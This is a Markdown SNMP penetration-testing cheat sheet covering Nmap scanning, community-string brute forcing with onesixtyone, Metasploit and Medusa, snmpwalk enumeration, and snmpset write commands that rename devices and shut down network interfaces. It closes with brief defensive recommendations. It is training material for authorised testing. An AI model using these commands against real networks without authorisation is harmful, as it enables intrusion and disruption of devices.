# SNMP Penetration Testing (Ports 161 / 162)

## ðŸ“¡ SNMP (Simple Network Management Protocol)

- **Ports**
  - **161/UDP â€“ Queries**
    - SNMP Manager â†’ Agent
    - GET, GETNEXT, GETBULK, SET requests
  - **162/UDP â€“ Traps**
    - Agent â†’ Manager
    - Unsolicited alerts (interface down, high CPU, reboot, etc.)

- **Purpose**: Network monitoring & device management  
- **Common Devices**: Routers, switches, firewalls, servers, printers, UPS  
- **Weaknesses**:
  - SNMPv1 / SNMPv2c â†’ **plaintext community strings**
  - Common defaults: `public` (RO), `private` (RW)

---

## ðŸ”Ž Port Summary

| Port   | Protocol   | Direction        | Description              |
|--------|------------|------------------|--------------------------|
| 161/UDP | SNMP       | Manager â†’ Device | Queries (GET / SET)      |
| 162/UDP | SNMP-Trap  | Device â†’ Manager | Alerts / Notifications   |

---

## 1. Reconnaissance (Nmap)

### Detect SNMP Service
```bash
nmap -sU -p 161,162 -Pn <target>
```

### Service & Version Detection
```bash
nmap -sU -p 161 -sV -Pn <target>
```

### Basic SNMP Info
```bash
nmap -sU -p 161 -Pn --script snmp-info <target>
```

---

## 2. Community String Discovery ðŸ”‘

### Using onesixtyone (Fast)
```bash
onesixtyone -c community.txt <target>
```

### Using Nmap (snmp-brute)
```bash
nmap -sU -p 161 -Pn \
--script snmp-brute \
--script-args snmp-brute.communitiesdb=community.txt \
<target>
```

### Using Metasploit
```bash
msfconsole
use auxiliary/scanner/snmp/snmp_login
set RHOSTS <target>
set PASS_FILE community.txt
run
```

### Using Medusa
```bash
medusa -h <target> -u admin -P community.txt -M snmp
```

---

## 3. Enumeration (After Valid Community Found)

### Full SNMP Walk
```bash
snmpwalk -v2c -c <community> <target>
snmpwalk -v1  -c <community> <target>
```

### Targeted Enumeration
```bash
snmpwalk -v2c -c <community> <target> system
snmpwalk -v2c -c <community> <target> interfaces
snmpwalk -v2c -c <community> <target> ipAddrTable
```

### Enumeration Using Nmap Scripts
```bash
nmap -sU -p 161 -Pn \
--script snmp-sysdescr,snmp-interfaces,snmp-processes,snmp-netstat \
<target>
```

### Automated Enumeration
```bash
snmpcheck -c <community> <target>
```

---

## 4. Write-Access Exploitation âš ï¸

> Applicable **only if RW (Read-Write) community string is found** (e.g., `private`)

### Change Device Hostname
```bash
snmpset -v2c -c private <target> \
.1.3.6.1.2.1.1.5.0 s "HackedDevice"
```

### Shutdown Network Interface
```bash
snmpset -v2c -c private <target> \
.1.3.6.1.2.1.2.2.1.7.1 i 2
```

### Write Access via Metasploit
```bash
msfconsole
use auxiliary/scanner/snmp/snmp_set
set RHOSTS <target>
set COMMUNITY private
set OID <OID>
set VALUE <value>
run
```

### OID Discovery
```bash
snmptranslate -On iso.3.6.1.2.1.25.6.3.1.2.371
```

---

## 5. SNMPv3 Detection & Security Check

```bash
nmap -sU -p 161 --script snmp-info <target>
```

If **SNMPv3** is detected:
- Community strings are **not used**
- Brute force is **significantly harder**
- Focus shifts to credential leaks & misconfigurations

---

## 6. Defensive Recommendations (Blue Team)

- Disable SNMP if not required  
- Use **SNMPv3 only**  
- Restrict SNMP access by IP  
- Change default community strings  
- Monitor UDP 161 / 162 traffic  
- Enable logging & alerts  

---

## ðŸŽ¯ Final Verdict

âœ… **Perfect for real-world SNMP pentesting**  
âœ… **Nmap-focused with proper tool chaining**  
âœ… **Interview & certification ready (CEH / PNPT / OSCP)**  
âœ… **Clear separation of recon â†’ enum â†’ exploitation**

---

## ðŸš€ Next Steps

- ðŸ“„ **One-page SNMP Cheat Sheet**  
- ðŸ§ª **Kali + Metasploitable SNMP Lab**  
- ðŸ›¡ **Detection with Wireshark / SIEM**  
- ðŸ“¦ **GitHub Repo Template**  
